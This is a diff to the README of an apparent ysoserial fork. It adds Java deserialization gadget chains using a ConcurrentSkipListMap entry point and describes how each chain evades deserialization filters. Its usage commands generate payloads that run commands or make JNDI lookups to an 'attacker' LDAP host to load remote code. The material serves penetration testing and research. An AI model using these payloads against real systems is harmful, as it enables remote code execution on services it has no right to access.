@@ -1,7 +1,7 @@
 
 # ysoserial (extended)
 
-Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **26+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner), independent research, and automated fuzzer discovery. Focuses on filter-bypass entry points, cross-library evasion, and JDK 17+ compatible sinks.
+Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **29+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner), independent research, and automated fuzzer discovery. Focuses on filter-bypass entry points, cross-library evasion, and JDK 17+ compatible sinks.
 
 A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
@@ -16,6 +16,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | Entry Class | Chains | Why It Bypasses |
 |-------------|--------|-----------------|
 | `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
+| `ConcurrentSkipListMap` | CC16 ‡, CB5 ‡, CBJndi3 ‡ | Never blocked — first use as deser entry point |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
 | `LinkedHashSet` | CC12, CC13 †, CC15 | Extends HashSet but class-level filters often miss it |
 | `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
@@ -30,6 +31,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 |-------|------|----------------------------------|
 | `CC14` | `InstantiateTransformer` → `TrAXFilter` → `TemplatesImpl` | Same package as InvokerTransformer, but rarely filtered |
 | `CC15` | Same as CC14 + LinkedHashSet root | Double evasion: root + sink bypass |
+| `CC16` ‡ | ConcurrentSkipListMap + `InstantiateTransformer` | Triple evasion: new entry + sink + no LazyMap |
 | `CC13` † | Cross-library CC4→CC3 + InvokerTransformer | Version-specific filters miss cross-library |
 
 ### JDK 17+ Compatible (No TemplatesImpl)
@@ -45,6 +47,7 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | `CommonsBeanutilsJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar CommonsBeanutilsJndi 'ldap://attacker/Exploit'` |
 | `CommonsBeanutilsJndi2` | `JdbcRowSetImpl` → JNDI | CB + CC4 variant |
 | `CommonsBeanutils4` | `JdbcRowSetImpl` → JNDI | CB + PriorityQueue + JNDI sink |
+| `CommonsBeanutilsJndi3` ‡ | `JdbcRowSetImpl` → JNDI | CB + ConcurrentSkipListMap — novel entry, no CC needed |
 | `CommonsBeanutilsH2` | `JdbcRowSetImpl` → H2 JDBC INIT | RCE via H2 SQL (requires H2 1.x on target) |
 | `WildFly1` | `InitialContext.lookup()` | Direct JNDI from `readObject()` — 120 bytes |
 
@@ -90,8 +93,13 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsCollections13` | @dmbs335 † | CC4 TiedMapEntry + CC3 LazyMap + LinkedHashSet — cross-library + root bypass |
 | `CommonsCollections14` | @zema1 | CC6 trigger + InstantiateTransformer sink — InvokerTransformer filter bypass |
 | `CommonsCollections15` | @zema1, @su18 | LinkedHashSet + InstantiateTransformer — double evasion (root + sink) |
+| `CommonsCollections16` | @dmbs335 ‡ | ConcurrentSkipListMap + InstantiateTransformer — novel entry point, 5x filter bypass |
+| `CommonsBeanutils5` | @dmbs335 ‡ | ConcurrentSkipListMap + BeanComparator — no CC dependency on target |
+| `CommonsBeanutilsJndi3` | @dmbs335 ‡ | ConcurrentSkipListMap + JNDI — JDK 17+ friendly, no CC, no TemplatesImpl |
 
 > **†** Discovered by @dmbs335 via automated fuzzing ([web-fuzzer](https://github.com/dmbs335/web-fuzzer), 2026-03-14). CC13 (cross-library CC4+CC3) and CCJndi2 (cross-library JNDI) are novel chains found by type-aware mutation and cross-library chain splicing.
+>
+> **‡** Discovered by @dmbs335 via manual analysis (2026-03-14). CC16, CB5, and CBJndi3 use `ConcurrentSkipListMap` as the first-ever deserialization entry point from `java.util.concurrent` that triggers via `comparator.compare()`. This class has never appeared in any known gadget chain or filter blocklist.
 
 ### Exploit Tools
 
@@ -100,7 +108,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `JRMPListener` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <payload> <cmd>` |
 | `RMIRegistryExploit` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <payload> <cmd>` |
 
-## All Payloads (73 total)
+## All Payloads (76 total)
 
 ```
 Payload                Authors                                Dependencies
@@ -120,9 +128,11 @@ CommonsBeanutils1      @frohoff                               commons-beanutils:
 CommonsBeanutils2      @k4n5ha0                               commons-beanutils:1.9.2
 CommonsBeanutils3      @su18                                  commons-beanutils:1.9.2, commons-collections4:4.0
 CommonsBeanutils4      @su18                                  commons-beanutils:1.9.2, commons-collections:3.1
+CommonsBeanutils5      @dmbs335 ‡                             commons-beanutils:1.9.2
 CommonsBeanutilsH2     @hmunch                                commons-beanutils:1.9.2
 CommonsBeanutilsJndi   @frohoff                               commons-beanutils:1.9.2
 CommonsBeanutilsJndi2  @su18                                  commons-beanutils:1.9.2, commons-collections4:4.0
+CommonsBeanutilsJndi3  @dmbs335 ‡                             commons-beanutils:1.9.2
 CommonsCollections1    @frohoff                               commons-collections:3.1
 CommonsCollections2    @frohoff                               commons-collections4:4.0
 CommonsCollections3    @frohoff                               commons-collections:3.1
@@ -138,6 +148,7 @@ CommonsCollections12   @su18                                  commons-collection
 CommonsCollections13   @dmbs335 †                             commons-collections:3.1, commons-collections4:4.0
 CommonsCollections14   @zema1                                 commons-collections:3.1
 CommonsCollections15   @zema1, @su18                          commons-collections:3.1
+CommonsCollections16   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollectionsJndi @mbechler                              commons-collections:3.1
 CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
 FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
@@ -233,6 +244,15 @@ java -jar ysoserial.jar C3P02 'calc.exe' > payload.bin
 
 # Cross-library + JNDI sink
 java -jar ysoserial.jar CommonsCollectionsJndi2 'ldap://attacker:1389/Exploit' > payload.bin
+
+# ConcurrentSkipListMap entry — bypasses all classic collection filters + InvokerTransformer
+java -jar ysoserial.jar CommonsCollections16 'calc.exe' > payload.bin
+
+# ConcurrentSkipListMap + BeanComparator — no commons-collections needed on target
+java -jar ysoserial.jar CommonsBeanutils5 'calc.exe' > payload.bin
+
+# ConcurrentSkipListMap + JNDI — JDK 17+, no TemplatesImpl, no commons-collections
+java -jar ysoserial.jar CommonsBeanutilsJndi3 'ldap://attacker:1389/Exploit' > payload.bin
 
 # Nested wrapper to bypass first-layer type filters
 java -jar ysoserial.jar SignedObjectWrap 'calc.exe' > payload.bin
